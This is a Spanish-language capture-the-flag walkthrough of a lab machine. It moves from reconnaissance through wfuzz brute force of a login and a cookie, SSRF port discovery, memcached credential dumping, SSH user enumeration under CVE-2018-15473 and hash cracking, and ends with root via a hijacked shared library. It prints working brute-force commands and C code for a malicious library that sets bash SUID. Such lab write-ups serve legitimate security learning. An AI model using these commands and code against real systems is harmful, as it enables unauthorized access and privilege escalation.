-----------
- Tags: #wfuzz-enumeration #SSRF #memcache #password-crack #CVE-2018-15473 #Hijacking #dynamically-inked-shared-object-library #SUID 
- ------
## Técnicas utilizadas
- Applying brute force to an authentication panel - Wfuzz (Discovering valid password)  
- Applying cookie discovery with Wfuzz (Brute Force)  
- SSRF - Server Side Request Forgery (Internal Port Discovery) - Wfuzz  
- Abusing Memcached - Getting stored credentials  
- Cracking Hashes  
- SSH User Enumeration - CVE-2018-15473  
- Abusing SUID Binary  
- Ltrace/Radare2 Inspection (Password Leaking)  
- Hijacking dynamically linked shared object library [Privilege Escalation]
## Procedimiento
![[Pasted image 20230809191839.png]]

#### Reconocimiento
Si lanzamos un **nmap** a la maquina, encontramos los siguientes puertos abiertos:
```ruby
# nmap -sCV -p21,22,80,8080 -oN Ports 10.10.10.86
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-10 02:37 UTC
Nmap scan report for 10.10.10.86
Host is up (0.13s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0            8803 Mar 26  2018 dab.jpg
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.13
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 2005771e7366bb1e7d460f65502cf90e (RSA)
|   256 61ae1523fcbcbc291306f210e00edaa0 (ECDSA)
|_  256 2d35964c5edd5cc063f0dc86f1b176b5 (ED25519)
80/tcp   open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
| http-title: Login
|_Requested resource was http://10.10.10.86/login
8080/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
|_http-title: Internal Dev
|_http-server-header: nginx/1.10.3 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.17 seconds
```

Un escaneo con **whatweb** para conocer los aplicativos web, nos muestra este resultado:
```ruby
#  whatweb 10.10.10.86
http://10.10.10.86 [302 Found] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.10.3 (Ubuntu)], IP[10.10.10.86], RedirectLocation[http://10.10.10.86/login], Title[Redirecting...], probably Werkzeug, nginx[1.10.3]
http://10.10.10.86/login [200 OK] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.10.3 (Ubuntu)], IP[10.10.10.86], PasswordField[password], Title[Login], nginx[1.10.3]
```

#### Applying brute force to an authentication panel - Wfuzz (Discovering valid password)  
En el escaneo de **nmap** vemos que podemos iniciar sesión en el servicio **FTP** como el usuario anonymois sin proporcionar credenciales. Dentro, encontramos una imagen de nombre **dab.jpg** (nombre de la maquina).
Una vez tengamos la imagen, podemos aplicar un `steghide` para ver si en los bytes menos significativos de la imagen se encuentra algo interesante:
![[Pasted image 20230810024144.png]]

Encontramos un archivo de texto, ahora con `steghide extract -sf dab.jpg` podemos extrar el archivo para posteriormente leerlo y ver su contenido:
![[Pasted image 20230810024214.png]]

Basicamente, nos tomaron el pelo y era un simple **Rabit Hole**.

Dejando un lado esto, el sitio web aloja un login el cual de primeras, no parece vulnerable:
![[Pasted image 20230810024810.png]]

Jugando un poco con el, vemos que tiene un pequeño problema. Este consiste en que al ingresar un usuario potencialmente correcto, aparece **Error: Login Failed.** y cuando no lo es, aparece el mismo mensaje pero sin el punto final:
![[Pasted image 20230810024829.png]]

Damos con el usuario **admin** y como el login no cuenta con proteciones de **TOKEN** para el inicio de sesión, podemos tirar directamente de **wfuzz** para bruteforcear el login:
```
# wfuzz -c -X POST -t 50 -w /usr/share/SecLists/Passwords/xato-net-10-million-passwords-10000.txt -d 'username=admin&password=FUZZ&submit=Login'
```

El resultado como tal, nos muestra una contraseña para el usuario administrador:
![[Pasted image 20230810025333.png]]

------------
#### Applying cookie discovery with Wfuzz (Brute Force)  
No vemos nada interesante, solo hay una lista de compras el cual va cambiando de manera dinamica.
Recordemos también que tenemos una pagina web en el puerto **8080**, que al visitarlo, vemos que nos indica que tenemos que colocar una cookie de nombre **password** con un valor correcto.

Podemos fuzzear por la contraseña correcta también aqui con **wfuzz**
```
# wfuzz -c -t 50 -w /usr/share/SecLists/Passwords/xato-net-10-million-passwords-10000.txt -b "session=cookie; password=FUZZ" http://10.10.10.10:8080 
```

Encontramos una contraseña y el resultado es el siguiente:
![[Pasted image 20230810030635.png]]

Colocamos la cookie en el navegador y al recargar la pagina podemos ver el siguiente panel de control:
![[Pasted image 20230810030714.png]]

---------------
#### SSRF - Server Side Request Forgery (Internal Port Discovery) - Wfuzz 
En este panel, podemos mandar información algún puerto interno de la maquina:
![[Pasted image 20230810030804.png]]

Podemos aprovecharnos de esto, para, con wfuzz denuevo, enumerar puertos internos de la maquina:
```
# wfuzz -c -t 50 -z range,1-65535 -b "session=cookie; password=secret" "http://10.10.10.10:8080/socket?port=FUZZ&cmd=123"
```

Encontramos que esta abierto **11211** que corresponde o suele corresponder a **MemCache**

-----------
#### Abusing Memcached - Getting stored credentials  

Con [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/11211-memcache) podemos empezar a enumerar el servicio. Rebuscando bien, llegamos a dar con usuarios y sus respectivos hashes:
![[Pasted image 20230810032130.png]]

BIen, son demasiados, asi que debemos buscar una forma de acotar esta lista, si no, nos llevaria toda la vida crekeando los hashes.

---------
#### SSH User Enumeration - CVE-2018-15473  
Analizando la versión de **SSH** que se esta utilizando en la maquina, vemos que es bastante anticuada y desactualizada, de hecho, esa misma versión cuenta con una vulnerabilidad de tipo ***Information Leak***. Haciendo uso del script que nos brinda **SearchSploit** (User Enumeration (2)) podemos validar usuarios validos:
```
# cat users | while read username; do python2 ssh_users_enumeration.py 10.10.10.10 $username 2>/dev/null; done | tee results.txt
```

Encontramos solo un usuario valido a nivel de sistema:
![[Pasted image 20230810033304.png]]

-------------
#### Cracking Hashes  
El hash respectivo del usuario lo podemos crackear en [CrackStation](https://crackstation.net/):
![[Pasted image 20230810033511.png]]

--------------
#### Abusing SUID Binary
Si listamos nuestros privilegios a nivel de Sudoers encontramos que podemos ejecutar el archivo de nombre **try_harder** como cualquier usuario:
![[Pasted image 20230810033545.png]]

Si lo ejecutamos, aparentemente estamos como **root** pero no es mas que un **rabit hole** ya que al hacerle un **strings** podemos ver la siguiente cadena burlandose de nosotros:
![[Pasted image 20230810033626.png]]

Listando ahora por archivos con privilegio **SUID** encontramos uno interesante:
![[Pasted image 20230810033653.png]]

----------------
#### Ltrace/Radare2 Inspection (Password Leaking)  
Al ejecutarlo, nos pide una contraseña la cual podemos intentar ver si le lanzamos un **ltrace** al archivo:
![[Pasted image 20230810033742.png]]

Cuando ingresamos la contraseña, nos aparece un mensaje que dice que la función **seclogin()** ha sido **llamada**:
![[Pasted image 20230810033803.png]]

Lo que podemos hacer para inspeccionar más a bajo nivel el binario, es traernoslo a nuestro equipo y ejecutarlo con **radare2**.

`aaa`: Analizamos todas las funciones.
`afl`: Listamos las funciónes existentes.
`s main`: Nos sincronizamos a la función main.

Pero no hay nada más interesante, aparte de la contraseña que anteriormente ya encontramos.

-------------
#### Hijacking dynamically linked shared object library [Privilege Escalation]
Si listamos las librerias compartidas utilizadas en el archivo con **ldd** encontramos una de nombre **libseclogin.so**:
![[Pasted image 20230810033849.png]]

bien, pues estas librerias suelen cargar su orden de prioridad desde el **/etc/ld.so.conf.d** y tenemos capacidad de escritura en esta ruta. Lo que haremos es crear un archivo en **C**:
```c#
#include <stdio.h>

void seclogin(){
	setreuid(0,0);
	system("chmod u+s /bin/bash");
	return 0;
}
```

Compilamos este archivo de esta forma:
```
# gcc exploit.c -fPIC -shared -o libseclogin.so
```

Luego, en **/etc/ld.so.conf.d/** vamos a crear un archivo **.conf** que contenga la ruta de nuestro binario compilado malicioso:
```ruby
<path>/<to>/<malicious-library> #example /tmp/
```

Porteriomente, ejecutaremos el siguiente comando a nivel de sistema:
```
# ldconfig
```

Entonces, ya con esto, solo nos queda ejecutar el binario y tendriamos el **SUID** en la **bash**




